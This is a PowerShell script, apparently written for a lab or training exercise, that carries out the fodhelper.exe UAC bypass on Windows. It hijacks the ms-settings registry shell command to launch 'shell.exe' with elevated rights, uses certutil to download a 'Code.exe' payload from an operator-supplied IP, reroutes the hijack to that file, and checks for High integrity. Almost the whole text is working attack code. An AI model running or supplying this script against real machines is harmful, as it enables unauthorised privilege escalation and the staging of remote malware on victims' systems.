# PowerShell Script for Registry Manipulation and Privilege Escalation Checks
# 1) Checks for the existence of 32-bit or 64-bit fodhelper.exe
# 2) Modifies the registry to replace the default shell command for ms-settings
# 3) Executes fodhelper.exe and runs 'whoami /groups'
# 4) Downloads 'Code.exe' from a user-provided IP via Port 80
# 5) Modifies the registry again, setting the path to 'backup.exe'
# 6) Runs 'whoami /groups' again and checks for "High" privilege level
#
# Author DeMzDaRulez
# Updated 10Sep23


# Ensure running in PowerShell
if ($PSEdition -eq $null) {
    Write-Host "Run in PowerShell"
    exit 1
}

# Check existence of fodhelper.exe 
$fodhelper32 = "C:\Windows\System32\fodhelper.exe"
$fodhelper64 = "C:\Windows\SysNative\fodhelper.exe"

if ((Test-Path -Path $fodhelper32) -or (Test-Path -Path $fodhelper64)) {
    ###################################
    # Registry modification
    ###################################
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\Users\ted\shell.exe" -Force

    ###################################
    # Execute fodhelper to 
    ###################################
    if (Test-Path -Path $fodhelper64) {
        Start-Process $fodhelper64
    } else {
        Start-Process $fodhelper32
    }
    
    # Run whoami /groups
    $whoamiOutput = whoami /groups
    Write-Host $whoamiOutput

    # Prompt for Host IP
    $hostIP = Read-Host -Prompt "Enter the IP address serving the Code.exe payload via Port 80"

    # Download Code.exe
    certutil -urlcache -split -f "http://$hostIP:80/Code.exe" ".\backup.exe"

    # Registry modification with backup.exe
    REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
    REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ 
    REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d (Resolve-Path ".\backup.exe") /f 

    # Run whoami /groups again and check for "High"
    $whoamiOutput = whoami /groups
    if ($whoamiOutput -like "*High*") {
        Write-Host "Operation successful."
    } else {
        Write-Host "Sorry, something went wrong."
    }
    
} else {
    Write-Host "Neither 32-bit nor 64-bit fodhelper.exe found. Exiting."
    exit 1
}
